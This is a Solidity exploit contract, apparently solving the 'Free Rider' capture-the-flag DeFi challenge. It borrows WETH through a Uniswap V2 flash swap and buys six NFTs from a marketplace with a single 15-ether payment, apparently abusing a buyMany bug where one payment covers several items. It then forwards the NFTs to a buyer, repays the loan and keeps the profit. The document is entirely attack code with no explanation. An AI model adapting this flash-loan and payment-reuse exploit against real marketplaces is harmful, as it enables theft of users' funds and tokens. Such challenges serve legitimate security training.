// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import "./IUniswapV2Pair.sol";
import "@openzeppelin/contracts/token/ERC721/IERC721.sol";
import "@openzeppelin/contracts/token/ERC721/IERC721Receiver.sol";
import "hardhat/console.sol";

contract HackFreeRider is IERC721Receiver {

    IUniswapV2Pair pool;
    IWETH WETH;
    IERC721 nft;
    address marketplace;
    address buyer;

    constructor(
        address _pool, 
        address _WETH, 
        address _marketplace, 
        address _nft, 
        address _buyer
    ) {
        pool = IUniswapV2Pair(_pool);
        WETH = IWETH(_WETH);
        marketplace = _marketplace;
        nft = IERC721(_nft);
        buyer = _buyer;
    }

    function start(address _token, uint256 borrowAmount) external {
    
        address token0 = pool.token0();
        address token1 = pool.token1();
        uint256 token0_out = _token == token0 ? borrowAmount : 0;
        uint256 token1_out = _token == token1 ? borrowAmount : 0;

        bytes memory data = abi.encode(_token, borrowAmount);
        pool.swap(token0_out, token1_out, address(this), data);

    }

    function uniswapV2Call(address sender, uint amount0, uint amount1, bytes calldata data) payable external {

        (address tokenBorrow, uint amount) = abi.decode(data, (address, uint));
    
        // calculate the fee
        uint fee = ((amount * 3) / 997) + 1;
        uint amountToRepay = amount + fee;

        // convert WETH to ETH
        WETH.withdraw(amount);

        // exploit
        uint256[] memory tokenIds = new uint256[](6);
        tokenIds[0] = 0;
        tokenIds[1] = 1;
        tokenIds[2] = 2;
        tokenIds[3] = 3;
        tokenIds[4] = 4;
        tokenIds[5] = 5;

        IMarketPlace(marketplace).buyMany{value: 15 ether}(tokenIds);

        for(uint256 i; i < tokenIds.length; ++i) {
            nft.safeTransferFrom(address(this), buyer, i);
        }

        // repay
        WETH.deposit{value: amountToRepay}();
        WETH.transfer(address(pool), amountToRepay);

    }

    function withdrawProfit(address to) external {
        payable(to).transfer(address(this).balance);
    }

    function onERC721Received(address, address, uint256, bytes calldata) external override pure returns (bytes4) {
        return IERC721Receiver.onERC721Received.selector;
    }

    receive() external payable {}

}